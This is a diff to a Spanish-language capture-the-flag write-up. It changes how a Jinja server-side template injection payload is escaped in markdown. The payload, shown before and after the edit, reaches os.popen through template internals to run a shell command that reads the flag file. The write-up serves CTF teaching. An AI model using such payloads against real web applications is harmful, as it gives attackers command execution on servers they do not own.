@@ -25,8 +25,8 @@ Si enviamos dicha cadena, efectivamente recibimos un error:
 
 De forma, que con un input como el siguiente, se nos dará la flag:
 
-```jinja
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
+```
+\{\{ self._TemplateReference\_\_context.cycler.\_\_init\_\_.\_\_globals\_\_.os.popen('cat flag.txt').read() \}\}
 ```
 
 Eso sería todo, si te ha gustado, échale un ojo a mi otro [writeup de web]({% post_url 2024-11-04-Anti-Spirit-FCaptcha-Haunted-Brewery-CTF %}).
